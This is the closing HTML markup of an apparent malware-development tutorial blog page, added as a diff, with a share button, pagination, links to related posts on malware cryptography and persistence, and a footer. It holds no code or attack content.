+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fcocomelonc.github.io%2Ftutorial%2F2021%2F09%2F06%2Fsimple-malware-av-evasion-2.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/tutorial/2021/09/04/simple-malware-av-evasion.html" class="pagination--pager" title="AV engines evasion for C++ simple malware
+">Previous</a>
+    
+    
+      <a href="/tutorial/2021/09/11/reverse-shells.html" class="pagination--pager" title="Reverse shells
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/114/2023-12-26_23-10.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/malware/2023/12/25/malware-cryptography-23.html" rel="permalink">Malware and cryptography 23: encrypt/decrypt file via TEA. Simple C/C++ example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/113/2023-12-13_11-49.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/book/2023/12/13/malwild-book.html" rel="permalink">Malware in the wild book.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/112/2023-12-11_01-01_1.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/persistence/2023/12/10/malware-pers-23.html" rel="permalink">Malware development: persistence - part 23. LNK files. Simple Powershell example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/111/2023-11-29_23-27.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/malware/2023/11/23/malware-cryptography-22.html" rel="permalink">Malware and cryptography 22: encrypt/decrypt payload via XTEA. Simple C++ example.
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">﷽
+
+</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+    </div>
+
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://twitter.com/cocomelonckz" rel="nofollow noopener noreferrer"><i class="fab fa-twitter" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://www.hackthebox.eu/profile/293150" rel="nofollow noopener noreferrer"><i class="far fa-flag" aria-hidden="true"></i> HackTheBox</a></li>
+        
+      
+        
+          <li><a href="https://tryhackme.com/p/cocomelonc" rel="nofollow noopener noreferrer"><i class="far fa-flag" aria-hidden="true"></i> TryHackMe</a></li>
+        
+      
+        
+          <li><a href="https://github.com/cocomelonc/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/zhassulan-zhussupov-5a347419b/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+    
+
+    
+      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 cocomelonc. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
